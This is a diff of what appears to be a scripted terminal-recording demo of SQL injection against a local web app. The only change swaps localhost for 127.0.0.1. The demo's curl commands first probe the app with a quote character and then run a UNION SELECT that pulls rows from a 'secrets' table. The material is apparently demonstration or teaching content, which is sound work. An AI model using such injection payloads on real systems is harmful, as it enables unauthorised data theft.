@@ -20,10 +20,10 @@ Sleep 3s
 
 Type "# pwn: probe with a quote" Enter
 Sleep 500ms
-Type `curl -s "http://localhost:5000/user?id=1'" | head -c 200; echo` Enter
+Type `curl -s "http://127.0.0.1:5000/user?id=1'" | head -c 200; echo` Enter
 Sleep 2.5s
 
 Type "# pwn: extract" Enter
 Sleep 500ms
-Type `curl -s "http://localhost:5000/user?id=1%20UNION%20SELECT%20id,name,value%20FROM%20secrets"` Enter
+Type `curl -s "http://127.0.0.1:5000/user?id=1%20UNION%20SELECT%20id,name,value%20FROM%20secrets"` Enter
 Sleep 4s
